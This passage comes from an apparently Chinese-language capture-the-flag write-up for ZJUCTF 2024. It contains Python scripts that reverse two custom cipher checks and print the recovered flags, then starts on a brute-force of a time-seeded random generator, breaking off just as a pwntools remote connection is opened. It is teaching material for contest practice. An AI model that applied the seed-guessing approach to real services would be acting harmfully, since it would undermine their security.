class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> string<br>numbers = [<br>    <span class="hljs-number">0x30231E3C</span>, <span class="hljs-number">0x794D0D52</span>, <span class="hljs-number">0xDB4F3D42</span>, <span class="hljs-number">0x2FB3FF</span>, <span class="hljs-number">0x4F323E1F</span>, <span class="hljs-number">0xA4A33E52</span>,<br>    <span class="hljs-number">0x8F21</span>, <span class="hljs-number">0xD19B8275</span>, <span class="hljs-number">0x36A6BBF6</span>, <span class="hljs-number">0x7FB1E8AC</span>, <span class="hljs-number">0x19B867B0</span>, <span class="hljs-number">0x7383FB6</span>, <br>    <span class="hljs-number">0x5283BD2E</span>, <span class="hljs-number">0xFFF5</span>, <span class="hljs-number">0xE4CDA88D</span>, <span class="hljs-number">0xCECEEEF8</span>, <span class="hljs-number">0x6EBF11CF</span>, <span class="hljs-number">0x4B50B9B8</span>, <br>    <span class="hljs-number">0x286B6DBE</span>, <span class="hljs-number">0xB3F3EB41</span>, <span class="hljs-number">0x87F5</span><br>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">n2l</span>(<span class="hljs-params">li</span>):<br>    new = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> li:<br>        tmp = i<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            new.append(tmp%(<span class="hljs-number">2</span>**<span class="hljs-number">8</span>))<br>            tmp = tmp&gt;&gt;<span class="hljs-number">8</span><br>    <span class="hljs-keyword">return</span> new<br>lis1 = n2l(numbers[:<span class="hljs-number">7</span>])[:<span class="hljs-number">26</span>]<br>lis2 = n2l(numbers[<span class="hljs-number">7</span>:<span class="hljs-number">14</span>])[:<span class="hljs-number">26</span>]<br>lis3 = n2l(numbers[<span class="hljs-number">14</span>:])[:<span class="hljs-number">26</span>]<br><span class="hljs-built_in">print</span>([<span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> lis1])<br><span class="hljs-built_in">print</span>([<span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> lis2])<br><span class="hljs-built_in">print</span>([<span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> lis3])<br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">das</span>(<span class="hljs-params">al,af,cf</span>):<br>    <span class="hljs-keyword">if</span> (al &amp; <span class="hljs-number">0x0F</span>) &gt; <span class="hljs-number">9</span> <span class="hljs-keyword">or</span> af:<br>        al -= <span class="hljs-number">0x06</span><br>    <span class="hljs-keyword">if</span> (al &amp; <span class="hljs-number">0xF0</span>) &gt; <span class="hljs-number">0x90</span> <span class="hljs-keyword">or</span> cf:<br>        al -= <span class="hljs-number">0x60</span><br>    <span class="hljs-keyword">return</span> al &amp; <span class="hljs-number">0xFF</span><br><br>flag  = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">26</span>):<br>    tmp = []<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> string.printable:<br>        AL = (<span class="hljs-built_in">ord</span>(j)-lis1[i])%(<span class="hljs-number">2</span>**<span class="hljs-number">8</span>)<br>        af,cf = <span class="hljs-number">1</span> <span class="hljs-keyword">if</span> ((<span class="hljs-built_in">ord</span>(j)&amp;<span class="hljs-number">0xf</span>)-(lis1[i]&amp;<span class="hljs-number">0xf</span>))&lt;<span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ord</span>(j)-lis1[i])&lt;<span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>        <span class="hljs-comment"># print(af,cf)</span><br>        AL = das(AL,af,cf)<br>        res = (lis2[i]+AL)%(<span class="hljs-number">2</span>**<span class="hljs-number">8</span>)<br>        <span class="hljs-keyword">if</span> res==lis3[i]:<br>            flag+=j<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment"># ZJUCTF&#123;welc0me-2-reverse!&#125;</span><br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/20.png"></li></ul><h2 id="rev3">rev3</h2><ul><li>放到ida里一看，甚至还没有去符号表，一道简单的逆向题目，rand种子也有了，那么rand结果都是确定的: <img src="/img/zjuctf2024/21.png"></li><li>把每个函数逆向一下，再整个逆向，连起来就好了，就是有点烦: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><code class="hljs python">sbox = [<br><span class="hljs-number">0x70</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x85</span>, <br><span class="hljs-number">0x57</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x93</span>, <br><span class="hljs-number">0x45</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x65</span>, <br><span class="hljs-number">0x92</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0xCE</span>, <br><span class="hljs-number">0x3E</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0xE1</span>, <br><span class="hljs-number">0x39</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xD6</span>, <br><span class="hljs-number">0x51</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xCC</span>, <br><span class="hljs-number">0xB0</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x99</span>, <br><span class="hljs-number">0xDF</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0xB7</span>, <br><span class="hljs-number">0xA9</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0xDE</span>, <br><span class="hljs-number">0x1B</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x22</span>, <br><span class="hljs-number">0xFE</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x08</span>, <br><span class="hljs-number">0xE8</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x7D</span>, <br><span class="hljs-number">0xA1</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0xFF</span>, <br><span class="hljs-number">0x64</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xDB</span>, <br><span class="hljs-number">0x8A</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x83</span>, <br><span class="hljs-number">0x02</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x7F</span>, <br><span class="hljs-number">0xBF</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x3B</span>, <br><span class="hljs-number">0x81</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x79</span>, <br><span class="hljs-number">0xA7</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0xB6</span>, <br><span class="hljs-number">0x2F</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x71</span>, <br><span class="hljs-number">0xBA</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x72</span>, <br><span class="hljs-number">0x07</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x2A</span>, <br><span class="hljs-number">0x68</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xBB</span>, <br><span class="hljs-number">0xC9</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x80</span>, <br><span class="hljs-number">0x9E</span><br>]<br>ans = [<br><span class="hljs-number">0xE6</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0xF7</span>, <br><span class="hljs-number">0x71</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x13</span>, <br><span class="hljs-number">0x73</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x82</span><br>]<br>rand = []<br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;random_numbers.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f.readlines():<br>    rand.append(<span class="hljs-built_in">int</span>(i))<br><span class="hljs-comment"># print(rand)</span><br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(sbox)==<span class="hljs-number">256</span><br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(ans)==<span class="hljs-number">28</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">b2w</span>(<span class="hljs-params">lis</span>):<br>    newlis = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(lis),<span class="hljs-number">4</span>):<br>        tmp = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> lis[i:i+<span class="hljs-number">4</span>][::-<span class="hljs-number">1</span>]:<br>            tmp = tmp*<span class="hljs-number">256</span>+j<br>        newlis.append(tmp)<br>    <span class="hljs-keyword">return</span> newlis<br><br>testflag = <span class="hljs-string">b&quot;ZJUCTF&#123;AAAAAAAAAAAAAAAAAAAA&#125;&quot;</span><br>testflaglis = b2w(testflag)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func1</span>(<span class="hljs-params">flaglis,randnum</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        flaglis[i] ^= randnum<br>        randnum = (randnum+<span class="hljs-number">16909060</span>)&amp;<span class="hljs-number">0xffffffff</span><br>    <span class="hljs-keyword">return</span> flaglis<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">revfunc1</span>(<span class="hljs-params">flaglis,randnum</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        flaglis[i] ^= (randnum+i*<span class="hljs-number">16909060</span>)&amp;<span class="hljs-number">0xffffffff</span><br>    <span class="hljs-keyword">return</span> flaglis<br><br><span class="hljs-keyword">assert</span> revfunc1(func1(testflaglis,rand[<span class="hljs-number">0</span>]),rand[<span class="hljs-number">0</span>])==testflaglis<br><br>testflaglis = func1(testflaglis,rand[<span class="hljs-number">0</span>])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ror32</span>(<span class="hljs-params">value, bits</span>):<br>    mask = <span class="hljs-number">0xFFFFFFFF</span><br>    <span class="hljs-keyword">return</span> ((value &gt;&gt; bits) | (value &lt;&lt; (<span class="hljs-number">32</span> - bits))) &amp; mask<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rol32</span>(<span class="hljs-params">value, bits</span>):<br>    mask = <span class="hljs-number">0xFFFFFFFF</span><br>    <span class="hljs-keyword">return</span> ((value &lt;&lt; bits) | (value &gt;&gt; (<span class="hljs-number">32</span> - bits))) &amp; mask<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func2</span>(<span class="hljs-params">flaglis,index</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        flaglis[i] ^= index+<span class="hljs-number">270817907</span><br>        flaglis[i] = rol32(flaglis[i],<span class="hljs-number">7</span>)-index<br>        flaglis[i] ^= <span class="hljs-number">570619159</span> - i<br>        flaglis[i] = ror32(flaglis[i],<span class="hljs-number">12</span>)<br>    <span class="hljs-keyword">return</span> flaglis<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">revfunc2</span>(<span class="hljs-params">flaglis,index</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        flaglis[i] = rol32(flaglis[i],<span class="hljs-number">12</span>)<br>        flaglis[i] ^= <span class="hljs-number">570619159</span> - i<br>        flaglis[i] = ror32((flaglis[i]+index),<span class="hljs-number">7</span>)<br>        flaglis[i] ^= index+<span class="hljs-number">270817907</span><br>    <span class="hljs-keyword">return</span> flaglis<br><br><span class="hljs-keyword">assert</span> revfunc2(func2(testflaglis,<span class="hljs-number">0</span>),<span class="hljs-number">0</span>)==testflaglis<br><br>testflaglis = func2(testflaglis,<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">w2b</span>(<span class="hljs-params">lis</span>):<br>    newlis = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(lis)):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            newlis.append(lis[i]%<span class="hljs-number">256</span>)<br>            lis[i] = lis[i]&gt;&gt;<span class="hljs-number">8</span><br>    <span class="hljs-keyword">return</span> newlis<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">findsbox</span>(<span class="hljs-params">flaglis</span>):<br>    tmp = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> w2b(flaglis):<br>        tmp.append(sbox[i])<br>    <span class="hljs-keyword">return</span> b2w(tmp)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">revfindbox</span>(<span class="hljs-params">flaglis</span>):<br>    tmp = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> w2b(flaglis):<br>        <span class="hljs-comment"># print(i,tmp)</span><br>        tmp.append(sbox.index(i))<br>    <span class="hljs-keyword">return</span> b2w(tmp)<br><br><span class="hljs-built_in">print</span>(testflaglis)<br><span class="hljs-built_in">print</span>(revfindbox(findsbox(testflaglis)))<br><span class="hljs-keyword">assert</span> revfindbox(findsbox(testflaglis))==testflaglis<br><br>testflaglis = findsbox(testflaglis)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func3</span>(<span class="hljs-params">flaglis</span>):<br>    tmp = w2b(flaglis)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">27</span>):<br>        tmp[i] ^= tmp[i+<span class="hljs-number">1</span>]<br>        tmp[i+<span class="hljs-number">1</span>] ^= tmp[i]<br>        tmp[i] ^= tmp[i+<span class="hljs-number">1</span>]<br>    flaglis = b2w(tmp)<br>    <span class="hljs-keyword">return</span> flaglis<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">revfunc3</span>(<span class="hljs-params">flaglis</span>):<br>    tmp = w2b(flaglis)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">26</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>        tmp[i] ^= tmp[i+<span class="hljs-number">1</span>]<br>        tmp[i+<span class="hljs-number">1</span>] ^= tmp[i]<br>        tmp[i] ^= tmp[i+<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">return</span> b2w(tmp)<br><br><span class="hljs-built_in">print</span>(testflaglis)<br><span class="hljs-built_in">print</span>(revfunc3(func3(testflaglis)))<br><span class="hljs-keyword">assert</span> revfunc3(func3(testflaglis))==testflaglis<br><br><span class="hljs-built_in">print</span>()<br><br>testflag = <span class="hljs-string">b&quot;ZJUCTF&#123;AAAAAAAAAAAAAAAAAAAA&#125;&quot;</span><br>testflaglis = b2w(testflag)<br><span class="hljs-built_in">print</span>(testflaglis)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">whole</span>(<span class="hljs-params">flaglis</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>        flaglis = func1(flaglis,rand[i])<br>        flaglis = func2(flaglis,i)<br>        flaglis = findsbox(flaglis)<br>        flaglis = func3(flaglis)<br>    flaglis = func1(flaglis,rand[<span class="hljs-number">20</span>])<br>    <span class="hljs-keyword">return</span> flaglis<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">revwhole</span>(<span class="hljs-params">flaglis</span>):<br>    flaglis = revfunc1(flaglis,rand[<span class="hljs-number">20</span>])<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">19</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>        flaglis = revfunc3(flaglis)<br>        flaglis = revfindbox(flaglis)<br>        flaglis = revfunc2(flaglis,i)<br>        flaglis = revfunc1(flaglis,rand[i])<br>    <span class="hljs-keyword">return</span> flaglis<br><span class="hljs-built_in">print</span>(revwhole(whole(testflaglis)))<br><span class="hljs-built_in">print</span>()<br><br>flaglis = b2w(ans)<br>flaglis = w2b(revwhole(flaglis))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flaglis:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(i),end=<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-comment"># ZJUCTF&#123;s0_EaSy_2_gE7_@n$W3R&#125;</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="中a口算">中A口算</h2><ul><li><p>放到ida里查看，发现随机数是用time(0)随机种子获取的，然后可以一次性输入0x1000个答案，由于每次check都会sleep一秒，因此只要随机数撞库，发三次0x1000个答案，超过10086分就可以拿下: <img src="/img/zjuctf2024/23.png"></p></li><li><p>但是实际上用ctype撞库并不成功，然后看到大A口算提示，可能系统时间被修改成很久以前，于是爆破，花了一个小时不到就撞出来了，大概是2010年: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> ctypes<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br><br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>io = remote(<span 